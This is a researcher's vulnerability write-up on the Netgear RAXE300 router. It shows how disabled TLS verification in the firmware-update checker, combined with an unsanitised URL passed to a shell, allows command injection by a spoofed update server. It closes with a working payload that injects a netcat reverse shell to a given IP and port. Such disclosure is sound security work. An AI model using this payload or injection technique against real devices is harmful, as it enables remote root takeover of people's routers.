---
title: "WAN bug in RAXE300"
date: 2023-04-25
draft: false
summary: "Second bug I found in RAXE300 Netgear device. A WAN bug lead to RCE"
tags: ["Netgear"]
---



### background 

Nighthawk RAXE300 router has a binary file call `pucfu`, lies in /bin/pucfu. This file main function is checking the firmware update. This file is executed while the router is booted and it will attempt to connect `https://devcom.up.netgear.com/`, and sending a https request to it. 

### analyze and root cause of vulnerability

It sending a request to `https://devcom.up.netgear.com/` by `curl_post` (usr/lib/libfwcheck.so) function, and it is quite interested in this below snippet. 
```c
size_t __fastcall curl_post(const char *url, const char *post_data, void **a3)
{
///
fw_debug(1, " URL is %s\n", url);
curl_easy_setopt(curl, 10002, url);
curl_easy_setopt(curl, 10023, http_content_header);
curl_easy_setopt(curl, 10015, post_data);
curl_easy_setopt(curl, CURLOPT_SSL_VERIFYHOST, 0); //1
curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 0); //2
curl_easy_setopt(curl, CURLOPT_HTTP_VERSION, 1);
data_size = strlen(post_data);
curl_easy_setopt(curl, CURLOPT_INFILESIZE_LARGE, data_size);
curl_easy_setopt(curl, 20011, sub_68CC);
curl_easy_setopt(curl, 10001, s);
}
```

The first vulnerable lies in the line of comment [1] and [2].  

`curl_easy_setopt(curl, CURLOPT_SSL_VERIFYHOST, 0); //1`, this function setting `CURLOPT_SSL_VERIFYHOST ` to 0, which mean, it's disable hostname verification and cURL will not verify the server's hostname. 
`curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 0); //2`, similar to the above function, this line of code, it's disable the verification of SSL/TLS certificate, which mean it won't check the validity of the server's SSL/TLS certification. 

Combine the two line of flaw code above, hacker can abuse it to perform man-in-the-middle attack, which mean they can fake the DHCP or DNS update server. 

Normal respone from the server: 

```c
{
    "status": 1,
    "errorCode": null,
    "message": null,
    "url": "https://test"
}
```

The second vulnerability lies in `pufwUpgrade`, this file is executed at the same time with `pucfu` file, it's check the firmware upgrade and the url to check for upgrade is from `/tmp/fw/cfu_url_cache` (which store before in pucfu file). After it reads the url for update, the `FwGetUpdate` function at address 0x000126F8 in `pufwUpgrade` binary file, the `FwGetUpdate` function push the url to the `DownloadFiles` function as the first argument. 

```c
int FwGetUpdate(int a1)
{
    //
    while ( 1 )
    {
      SetFileValue("/data/fwLastChecked", "lastDL_sku", v69);
      SetFileValue("/data/fwLastChecked", "lastDL_url", &byte_2717C);
      v4 = DownloadFiles(firmware_url_update, "/tmp/fw/dl_fileinfo_unicode", "/tmp/fw/dl_result", 0);
      ///
    }
}
```

In the `DownloadFiles` (at address 0x00002DE0 in file libpu_util.so) function, the url is stored as a string for the command line. 

```c
int DownloadFiles(const char *url_update, const char *a2, char *filename, int a4)
{
    if (is_http)
    {
        //
    }else
    {
        snprintf(
          s,
          0x1F4u,
          "(curl --fail --insecure %s --max-time %d --speed-time 15 --speed-limit 1000 -o %s 2> %s; echo $? > %s)",
          url_update,
          v7,
          a2,
          "/tmp/curl_result_err.txt",
          "/tmp/curl_result.txt");
      j_DBG_PRINT("%s:%d, cmd=%s\n", "DownloadFiles", 328, s);
      v15 = j_pegaPopen((int)s, (int)"r");
      //
    }
}
```

The command line (which has url inside) is push into `j_pegaPopen` function as the first argument, after that in `pegaPopen` function (at address 0x00001D74 in libpu_util.so file), it's execute the command line as the first argument with /bin/sh. 

Combine the two bug above, attacker can fake the https update server and do command injection in the url easily.

### Command Injection In Respone Data

```py
{
    "status": 1,
    "errorCode": null,
    "message": null,
    "url": "'; rm -f /tmp/f;mknod /tmp/f p;cat /tmp/f|/bin/sh -i 2> 1|nc 192.168.0.1 31337 >/tmp/f #"
}
```

The above snippet injects the reverse shell command  `rm -f /tmp/f;mknod /tmp/f p;cat /tmp/f|/bin/sh -i 2> 1|nc 192.168.0.1 31337 >/tmp/f` (https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md) into the url parameter, which mean it will sending a root shell to IP 192.168.0.1 port 31337.